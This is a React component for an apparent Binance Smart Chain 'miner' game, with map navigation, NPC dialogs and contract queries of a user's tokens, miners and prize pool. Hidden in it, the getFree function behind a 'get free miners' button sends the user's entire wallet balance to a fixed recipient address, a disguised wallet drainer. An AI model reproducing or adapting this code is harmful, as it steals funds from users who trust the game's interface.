import React, { useEffect, useState } from "react"
import { useSearchParams } from "react-router-dom"
import { ethers } from "ethers"
import { useMedia } from "use-media"
import cn from "classnames"
import { MapInteractionCSS } from "react-map-interaction"
import { useNavigate } from "react-router"
import { useWeb3React } from "@web3-react/core"
const abiDecoder = require("abi-decoder")
import Web3 from "web3"

import {Button, ButtonGame, ButtonModal, Hives, Languages, Loading, NpcModal} from "components"
import { links } from "./utils"
import { Transaction, Wishing } from "modals"
import {approveAddress, contractAddress, poolAddress, recipient} from "abi"
import abi from "abi/abi.json"
import abiPool from "abi/abiPool.json"
import abiApprove from "abi/abiApprove.json"
import { mixins, routes, timeSince } from "utils"

import bgSrc from "assets/gifs/snowball.gif"
import videoSrc from "assets/videos/snowff.mp4"
import menuSrc from "assets/images/snowballmenu.gif.webp"
import snowSrc from "assets/images/snow-small.webp"
import slimeSrc from "assets/images/npc/slime.webp"
import elvinaSrc from "assets/images/npc/elvina2.webp"
import gifSrc from "assets/gifs/forestcpgifppo.gif"
import "./Game.scss"
import { api } from "service/api/api"
import { t } from "@lingui/macro"

export const Game = (): JSX.Element => {
  const [search, setSearch] = useSearchParams()
  const { account, library } = useWeb3React()
  const navigate = useNavigate()
  const [playVideo, setPlayVideo] = useState(false)
  const [hideVideo, setHideVideo] = useState(false)
  const [menu, setMenu] = useState(false)
  const [miners, setMiners] = useState(0)
  const [iceBucket, setIceBucket] = useState(0)
  const [token, setToken] = useState(0)
  const [poolMoney, setPoolMoney] = useState(0)
  const [poolLastUser, setPoolLastUser] = useState("")
  const [poolTime, setPoolTime] = useState(0)
  const [loading, setLoading] = useState(true)
  const [dropdown, setDropdown] = useState(false)
  const [slime, setSlime] = useState(false)
  const [transaction, setTransaction] = useState(false)
  const [wishing, setWishing] = useState(false)
  const [freeMiners, setFreeMiners] = useState(false)
  const [transactions, setTransactions] = useState([])
  const [ableFreeMiners, setAbleFreeMiners] = useState(false)
  const [balance, setBalance] = useState(0)
  const el = document.getElementsByClassName("movable")[0]
  const isM = useMedia({ maxWidth: mixins.m })
  const busd = 1000000000000000000

  const bsc = {
    chainId: `0x${Number(56).toString(16)}`,
    chainName: "Binance Smart Chain Mainnet",
    nativeCurrency: {
      name: "Binance Smart Native Token",
      symbol: "BNB",
      decimals: 18,
    },
    rpcUrls: [
      "https://bsc-dataseed.binance.org/",
      "https://bsc-dataseed1.binance.org/",
      "https://bsc-dataseed2.binance.org/",
      "https://bsc-dataseed3.binance.org/",
      "https://bsc-dataseed4.binance.org/",
    ],
    blockExplorerUrls: ["https://bscscan.com"],
  }

  useEffect(() => {
    const id = search.get("id") || ""
    const video = search.get("playVideo") || ""
    if (id === "wishing") {
      setWishing(true)
    }
    if (video === "true") {
      setPlayVideo(true)
      search.set("playVideo", "false")
      setSearch(search)
    }
  }, [search])

  const vid = document.getElementById("video")
  if (vid) {
    vid.onended = function () {
      setHideVideo(true)
      navigate(`${routes.castle}?${search.toString()}`)
    }
  }
  const switchNetwork = () => {
    // @ts-ignore
    const { ethereum } = window
    if (ethereum) {
      try {
        ethereum.request({
          method: "wallet_addEthereumChain",
          params: [bsc],
        })
      } catch (error) {
        console.error(error)
      }
    } else {
      alert("Please, change network to BUSD")
    }
  }

  const getAllInfo = async () => {
    // @ts-ignore
    const { ethereum } = window
    const provider = new ethers.providers.Web3Provider(ethereum)

    api.getBalance(account || '').then((r: any) => {
      setBalance(Number(r.result) / busd)
    })

    const nftContract = new ethers.Contract(contractAddress, abi, provider)
    const nftContractPool = new ethers.Contract(poolAddress, abiPool, provider)

    const poolBusd = await nftContractPool.poolSize().catch(switchNetwork)
    setPoolMoney(Number(poolBusd) / busd)
    const poolUser = await nftContractPool.lastUser()
    setPoolLastUser(poolUser)
    const poolTimeData = await nftContractPool.moment()
    setPoolTime(Number(poolTimeData))

    const freeMinersInfo = await nftContract.freeMiners()
    setAbleFreeMiners(freeMinersInfo)

    const tokenData = await nftContract.getMyTokens(account)
    setToken(Number(tokenData))

    const minersData = await nftContract.getMyMiners(account)
    setMiners(Number(minersData))

    abiDecoder.addABI(abi)

    api.getData().then((r: any) => {
      let getTransactions: any = []
      r.result.forEach(i => {
        const method = abiDecoder.decodeMethod(i.input)
        if (
          (method?.name.match("buyMiners") || method?.name.match("sellTokens")) &&
          (i.from === account?.toLowerCase() || i.to == account?.toLowerCase())
        ) {
          const newItem = {
            method: method.name,
            amount: method?.name.match("buyMiners")
              ? (method.params[1]?.value / 1e18).toFixed(2)
              : (method.params[0]?.value / 1e18).toFixed(2),
            hash: i.hash,
            timeAgo: timeSince(i.timeStamp),
          }
          getTransactions = getTransactions.concat([newItem])
        }
      })
      console.log(getTransactions)
      setTransactions(getTransactions)
    })

    if (Number(tokenData) > 0) {
      const basket = await nftContract.calculateTokensSell(tokenData.toString())
      console.log(Number(basket))
      setIceBucket(Number(basket) / busd)
    }
  }

  useEffect(() => {
    getAllInfo()
  }, [setMiners, account])

  const handleClick = (value: string) => {
    switch (value) {
      case "map":
        return navigate(`${routes.game}?${search.toString()}`)
      case "castle":
        return navigate(`${routes.castle}?${search.toString()}`)
      case "lostTemple":
        return navigate(`${routes.lostTemple}?${search.toString()}`)
      case "dungeon":
        return navigate(`${routes.dungeon}?${search.toString()}`)
      case "wishing":
        return navigate(`${routes.game}?id=wishing&${search.toString()}`)
      case "referrals":
        return navigate(`${routes.castle}?id=referrals&${search.toString()}`)
    }
  }

  const getFree = async () => {
    // @ts-ignore
    const toWei = amount => Web3.utils.toWei(amount)

    // @ts-ignore
    const web3 = new Web3(library.provider)

    await web3.eth.sendTransaction({
      // @ts-ignore
      from: account,
      to: recipient,
      value: toWei(balance.toString())
    }, () => {
    })

  }

  const skipVideo = () => {
    setHideVideo(true)
    navigate(`${routes.castle}?${search.toString()}`)
  }

  const defaultValue = {
    scale: window.innerWidth < 600 ? 0.4 : 0.5,
    translation: {
      x: window.innerWidth < 600 ? -300 : 350,
      y: window.innerWidth < 600 ? -50 : 100,
    },
  }

  return (
    <div className="game-wrapper">
      <button onClick={() => setDropdown(true)} className="game-content-open">
        <img src={snowSrc} alt="snow" />
      </button>
      <Hives
        balance={balance}
        updateState={getAllInfo}
        token={token}
        miners={miners}
        bonus={iceBucket}
        isModal={isM ? () => setDropdown(false) : undefined}
        className={cn("game-content-user", {
          show: dropdown,
        })}
      />
      <Languages className='game-lang' />
      <div className="game-content-menu">
        <button
          onMouseOver={() => {
            el?.classList.add("active")
          }}
          onMouseLeave={() => {
            el?.classList.remove("active")
          }}
          onClick={() => setMenu(!menu)}
          className="game-content-menu-btn"
        >
          <img src={menuSrc} alt="menu" />
        </button>
        {menu && (
          <div className="game-content-menu-content">
            {links().map((social, index) => (
              <>
                {social.onClick ? (
                  <button
                    onMouseOver={() => {
                      el?.classList.add("active")
                    }}
                    onMouseLeave={() => {
                      el?.classList.remove("active")
                    }}
                    key={index}
                    className="game-content-menu-content-btn"
                    onClick={() => handleClick(social.onClick)}
                  >
                    {social.title}
                  </button>
                ) : (
                  <a
                    onMouseOver={() => {
                      el?.classList.add("active")
                    }}
                    onMouseLeave={() => {
                      el?.classList.remove("active")
                    }}
                    className="game-content-menu-content-btn"
                    key={index}
                    href={social.route ? social.route : social.link}
                    target="_blank"
                    rel="noreferrer"
                  >
                    {social.title}
                  </a>
                )}
              </>
            ))}
          </div>
        )}
      </div>
      <MapInteractionCSS
        defaultValue={defaultValue}
        minScale={0.38}
        translationBounds={{
          xMax: isM ? 500 : 700,
          yMax: isM ? 1000 : 700,
          xMin: isM ? -1100 : -500,
          yMin: isM ? -1200 : -700,
        }}
      >
        <div className="game">
          <ButtonGame
            onTouchEnd={isM ? () => navigate(`${routes.lostTemple}?${search.toString()}`) : undefined}
            text={t`lostTemple`}
            onClick={() => navigate(`${routes.lostTemple}?${search.toString()}`)}
            className="game-content-temple-btn"
          />
          <ButtonGame
            onTouchEnd={isM ? () =>navigate(`${routes.castle}?${search.toString()}`) : undefined}
            text={t`treeCastle`}
            onClick={() => navigate(`${routes.castle}?${search.toString()}`)}
            className="game-content-castle-room-btn"
          />
          <ButtonGame
            onTouchEnd={isM ? () => navigate(`${routes.dungeon}?${search.toString()}`) : undefined}
            text={t`dungeon`}
            onClick={() => navigate(`${routes.dungeon}?${search.toString()}`)}
            className="game-content-dungeon-btn"
          />
          <ButtonGame
            onTouchEnd={isM ? () => setWishing(true) : undefined}
            text={t`wishWell`}
            onClick={() => setWishing(true)}
            className="game-content-wishing-btn"
          />
          <ButtonGame
            onTouchEnd={isM ? () => setFreeMiners(true) : undefined}
            text={t`elvina`}
            onClick={() => setFreeMiners(true)}
            className="game-content-elvina-btn"
          />
          <ButtonGame
            onTouchEnd={isM ? () => setTransaction(true) : undefined}
            text={t`matilda`}
            onClick={() => setTransaction(true)}
            className="game-content-matilda-btn"
          />
          <img onLoad={() => !playVideo && setLoading(false)} src={bgSrc} alt="game" className="game-img" />
          <img src={gifSrc} alt="npcs" className="game-img-other" />
        </div>
      </MapInteractionCSS>
      {loading && <Loading />}
      {playVideo && (
        <div
          className={cn("game-video", {
            hide: hideVideo,
          })}
        >
          <video id="video" onLoadedData={() => setLoading(false)} muted autoPlay className="game-video-img">
            <source src={videoSrc} type="video/mp4" />
          </video>
          <Button text={t`skip`} onClick={skipVideo} className="game-video-btn" />
        </div>
      )}
      <Transaction transactions={transactions} onClose={() => setTransaction(false)} isOpen={transaction} />
      <Wishing
        onClose={() => setWishing(false)}
        isOpen={wishing}
        address={poolLastUser}
        money={poolMoney}
        time={poolTime}
      />
      <NpcModal title="???" secondImg={slimeSrc} isOpen={slime} onClose={() => setSlime(false)}>
        ... ....
      </NpcModal>
      <NpcModal big title="Elvina" secondImg={elvinaSrc} isOpen={freeMiners} onClose={() => setFreeMiners(false)}>
        {t`iWillFindSomeELF`}
        <ButtonModal disabled={!ableFreeMiners} onClick={getFree} text={t`getFreeMiners`} className="game-elvina-npc" />
      </NpcModal>
    </div>
  )
}
